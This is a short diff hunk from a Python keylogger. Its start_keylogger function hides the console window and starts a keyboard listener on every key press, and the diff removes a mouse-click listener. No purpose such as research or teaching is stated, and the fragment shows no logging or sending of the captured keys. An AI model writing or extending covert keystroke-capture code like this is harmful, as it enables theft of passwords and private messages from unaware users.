@@ -34,13 +34,8 @@ def start_keylogger():
     hide_console()
 
     keyboard_listener = keyboard.Listener(on_press=on_key_press)
-    mouse_listener = mouse.Listener(on_click=on_click)
-
     keyboard_listener.start()
-    mouse_listener.start()
-
     keyboard_listener.join()
-    mouse_listener.join()
 
 
 start_keylogger()
